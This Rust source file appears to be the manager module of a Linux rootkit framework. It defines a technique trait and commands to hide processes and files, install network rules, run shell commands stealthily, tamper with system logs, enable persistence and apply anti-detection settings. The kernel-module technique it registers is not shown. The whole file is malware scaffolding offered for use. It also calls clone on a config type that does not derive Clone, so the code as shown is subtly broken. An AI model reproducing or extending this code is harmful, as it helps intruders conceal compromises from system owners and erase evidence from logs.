use std::collections::HashMap;
use std::error::Error;
use serde::{Deserialize, Serialize};
use crate::bridge::KernelBridge;

pub mod lkm;
// Future modules for other techniques
// pub mod ebpf;
// pub mod preload;

/// Trait that all rootkit techniques must implement
pub trait RootkitTechnique: Send + Sync {
    /// Get the name of this rootkit technique
    fn name(&self) -> &str;

    /// Deploy the rootkit technique
    fn deploy(&mut self, bridge: &mut KernelBridge) -> Result<String, Box<dyn Error>>;

    /// Check if the technique is currently active
    fn is_active(&self) -> bool;

    /// Execute a command through this rootkit technique
    fn execute_command(&mut self, command: &str, params: &str) -> Result<String, Box<dyn Error>>;

    /// Get current status and statistics
    fn get_status(&self) -> Result<TechniqueStatus, Box<dyn Error>>;

    /// Clean up and remove the rootkit technique
    fn cleanup(&mut self) -> Result<(), Box<dyn Error>>;

    /// Get technique-specific capabilities
    fn get_capabilities(&self) -> Vec<String>;

    /// Handle technique-specific configuration
    fn configure(&mut self, config: TechniqueConfig) -> Result<(), Box<dyn Error>>;
}

/// Status information for a rootkit technique
#[derive(Debug, Serialize, Deserialize)]
pub struct TechniqueStatus {
    /// Technique name
    pub name: String,
    /// Whether the technique is active
    pub active: bool,
    /// Deployment timestamp
    pub deployed_at: Option<u64>,
    /// Number of processes hidden
    pub hidden_processes: u32,
    /// Number of files hidden
    pub hidden_files: u32,
    /// Number of network rules active
    pub network_rules: u32,
    /// Last error encountered
    pub last_error: Option<String>,
    /// Technique-specific metrics
    pub custom_metrics: HashMap<String, String>,
}

/// Configuration for rootkit techniques
#[derive(Debug, Serialize, Deserialize)]
pub struct TechniqueConfig {
    /// Stealth level (1-5, higher is more stealthy but potentially less stable)
    pub stealth_level: u8,
    /// Whether to enable anti-detection measures
    pub anti_detection: bool,
    /// Whether to enable persistence mechanisms
    pub persistence: bool,
    /// Custom configuration parameters
    pub custom_params: HashMap<String, String>,
}

impl Default for TechniqueConfig {
    fn default() -> Self {
        Self {
            stealth_level: 3,
            anti_detection: true,
            persistence: false,
            custom_params: HashMap::new(),
        }
    }
}

/// Commands that can be executed through rootkit techniques
#[derive(Debug, Serialize, Deserialize)]
pub enum RootkitCommand {
    /// Hide a process by PID
    HideProcess { pid: u32 },
    /// Unhide a process by PID
    UnhideProcess { pid: u32 },
    /// Hide a file or directory
    HideFile { path: String },
    /// Unhide a file or directory
    UnhideFile { path: String },
    /// List hidden processes
    ListHiddenProcesses,
    /// List hidden files
    ListHiddenFiles,
    /// Install network rule
    InstallNetRule { rule: crate::bridge::NetworkRule },
    /// Remove network rule
    RemoveNetRule { rule_id: String },
    /// Execute shell command stealthily
    StealthExec { command: String, args: Vec<String> },
    /// Modify system logs
    ModifyLogs { action: String, target: String },
    /// Enable/disable persistence
    SetPersistence { enabled: bool },
    /// Get technique status
    GetStatus,
}

/// Manager for all rootkit techniques
pub struct RootkitManager {
    /// Available technique implementations
    techniques: HashMap<String, Box<dyn RootkitTechnique>>,
    /// Currently active technique
    active_technique: Option<String>,
    /// Global configuration
    global_config: TechniqueConfig,
    /// Deployment history
    deployment_history: Vec<DeploymentRecord>,
}

/// Record of technique deployments
#[derive(Debug, Serialize, Deserialize)]
pub struct DeploymentRecord {
    /// Technique name
    pub technique: String,
    /// Deployment timestamp
    pub timestamp: u64,
    /// Whether deployment was successful
    pub success: bool,
    /// Deployment message
    pub message: String,
    /// Configuration used
    pub config: TechniqueConfig,
}

impl RootkitManager {
    /// Create a new rootkit manager
    pub fn new() -> Self {
        let mut manager = Self {
            techniques: HashMap::new(),
            active_technique: None,
            global_config: TechniqueConfig::default(),
            deployment_history: Vec::new(),
        };

        // Register available techniques
        manager.register_techniques();
        
        manager
    }

    /// Register all available rootkit techniques
    fn register_techniques(&mut self) {
        // Register LKM technique
        let lkm_technique = Box::new(lkm::LkmTechnique::new());
        self.techniques.insert("lkm".to_string(), lkm_technique);

        // Future technique registrations:
        // let ebpf_technique = Box::new(ebpf::EbpfTechnique::new());
        // self.techniques.insert("ebpf".to_string(), ebpf_technique);
        
        // let preload_technique = Box::new(preload::PreloadTechnique::new());
        // self.techniques.insert("preload".to_string(), preload_technique);
    }

    /// Get list of available techniques
    pub fn get_available_techniques(&self) -> Vec<String> {
        self.techniques.keys().cloned().collect()
    }

    /// Deploy a specific rootkit technique
    pub fn deploy_technique(&mut self, technique_name: &str, bridge: &mut KernelBridge) -> Result<String, Box<dyn Error>> {
        let technique = self.techniques.get_mut(technique_name)
            .ok_or_else(|| format!("Unknown technique: {}", technique_name))?;

        // Configure the technique with global settings
        technique.configure(self.global_config.clone())?;

        // Deploy the technique
        let result = technique.deploy(bridge);
        
        // Record deployment attempt
        let record = DeploymentRecord {
            technique: technique_name.to_string(),
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
            success: result.is_ok(),
            message: result.as_ref().map(|s| s.clone()).unwrap_or_else(|e| e.to_string()),
            config: self.global_config.clone(),
        };
        self.deployment_history.push(record);

        match result {
            Ok(msg) => {
                self.active_technique = Some(technique_name.to_string());
                Ok(msg)
            }
            Err(e) => Err(e),
        }
    }

    /// Execute a command through the active technique
    pub fn execute_command(&mut self, technique_name: &str, command: &str, params: &str) -> Result<String, Box<dyn Error>> {
        let technique = self.techniques.get_mut(technique_name)
            .ok_or_else(|| format!("Unknown technique: {}", technique_name))?;

        if !technique.is_active() {
            return Err("Technique is not active".into());
        }

        technique.execute_command(command, params)
    }

    /// Execute a structured rootkit command
    pub fn execute_rootkit_command(&mut self, command: RootkitCommand) -> Result<String, Box<dyn Error>> {
        let active_technique = self.active_technique.as_ref()
            .ok_or("No active technique")?;

        let technique = self.techniques.get_mut(active_technique)
            .ok_or("Active technique not found")?;

        match command {
            RootkitCommand::HideProcess { pid } => {
                technique.execute_command("hide_process", &pid.to_string())
            }
            RootkitCommand::UnhideProcess { pid } => {
                technique.execute_command("unhide_process", &pid.to_string())
            }
            RootkitCommand::HideFile { path } => {
                technique.execute_command("hide_file", &path)
            }
            RootkitCommand::UnhideFile { path } => {
                technique.execute_command("unhide_file", &path)
            }
            RootkitCommand::ListHiddenProcesses => {
                technique.execute_command("list_hidden_processes", "")
            }
            RootkitCommand::ListHiddenFiles => {
                technique.execute_command("list_hidden_files", "")
            }
            RootkitCommand::InstallNetRule { rule } => {
                let rule_json = serde_json::to_string(&rule)?;
                technique.execute_command("install_net_rule", &rule_json)
            }
            RootkitCommand::RemoveNetRule { rule_id } => {
                technique.execute_command("remove_net_rule", &rule_id)
            }
            RootkitCommand::StealthExec { command, args } => {
                let exec_params = serde_json::json!({
                    "command": command,
                    "args": args
                });
                technique.execute_command("stealth_exec", &exec_params.to_string())
            }
            RootkitCommand::ModifyLogs { action, target } => {
                let log_params = serde_json::json!({
                    "action": action,
                    "target": target
                });
                technique.execute_command("modify_logs", &log_params.to_string())
            }
            RootkitCommand::SetPersistence { enabled } => {
                technique.execute_command("set_persistence", &enabled.to_string())
            }
            RootkitCommand::GetStatus => {
                let status = technique.get_status()?;
                Ok(serde_json::to_string(&status)?)
            }
        }
    }

    /// Get status of a specific technique
    pub fn get_technique_status(&self, technique_name: &str) -> Result<TechniqueStatus, Box<dyn Error>> {
        let technique = self.techniques.get(technique_name)
            .ok_or_else(|| format!("Unknown technique: {}", technique_name))?;

        technique.get_status()
    }

    /// Get status of all techniques
    pub fn get_all_status(&self) -> Result<HashMap<String, TechniqueStatus>, Box<dyn Error>> {
        let mut status_map = HashMap::new();
        
        for (name, technique) in &self.techniques {
            match technique.get_status() {
                Ok(status) => {
                    status_map.insert(name.clone(), status);
                }
                Err(e) => {
                    // Create error status
                    let error_status = TechniqueStatus {
                        name: name.clone(),
                        active: false,
                        deployed_at: None,
                        hidden_processes: 0,
                        hidden_files: 0,
                        network_rules: 0,
                        last_error: Some(e.to_string()),
                        custom_metrics: HashMap::new(),
                    };
                    status_map.insert(name.clone(), error_status);
                }
            }
        }
        
        Ok(status_map)
    }

    /// Check if any technique is currently active
    pub fn has_active_technique(&self) -> bool {
        self.active_technique.is_some()
    }

    /// Get the name of the currently active technique
    pub fn get_active_technique(&self) -> Option<&String> {
        self.active_technique.as_ref()
    }

    /// Set global configuration for all techniques
    pub fn set_global_config(&mut self, config: TechniqueConfig) {
        self.global_config = config;
    }

    /// Get current global configuration
    pub fn get_global_config(&self) -> &TechniqueConfig {
        &self.global_config
    }

    /// Get deployment history
    pub fn get_deployment_history(&self) -> &[DeploymentRecord] {
        &self.deployment_history
    }

    /// Clean up a specific technique
    pub fn cleanup_technique(&mut self, technique_name: &str) -> Result<(), Box<dyn Error>> {
        let technique = self.techniques.get_mut(technique_name)
            .ok_or_else(|| format!("Unknown technique: {}", technique_name))?;

        technique.cleanup()?;

        if self.active_technique.as_ref() == Some(&technique_name.to_string()) {
            self.active_technique = None;
        }

        Ok(())
    }

    /// Clean up all active techniques
    pub fn cleanup_all(&mut self) -> Result<(), Box<dyn Error>> {
        let mut errors = Vec::new();

        for (name, technique) in &mut self.techniques {
            if let Err(e) = technique.cleanup() {
                errors.push(format!("Failed to cleanup {}: {}", name, e));
            }
        }

        self.active_technique = None;

        if !errors.is_empty() {
            Err(errors.join("; ").into())
        } else {
            Ok(())
        }
    }

    /// Get capabilities of a specific technique
    pub fn get_technique_capabilities(&self, technique_name: &str) -> Result<Vec<String>, Box<dyn Error>> {
        let technique = self.techniques.get(technique_name)
            .ok_or_else(|| format!("Unknown technique: {}", technique_name))?;

        Ok(technique.get_capabilities())
    }

    /// Get capabilities of all techniques
    pub fn get_all_capabilities(&self) -> HashMap<String, Vec<String>> {
        let mut capabilities_map = HashMap::new();
        
        for (name, technique) in &self.techniques {
            capabilities_map.insert(name.clone(), technique.get_capabilities());
        }
        
        capabilities_map
    }
}

impl Default for RootkitManager {
    fn default() -> Self {
        Self::new()
    }
}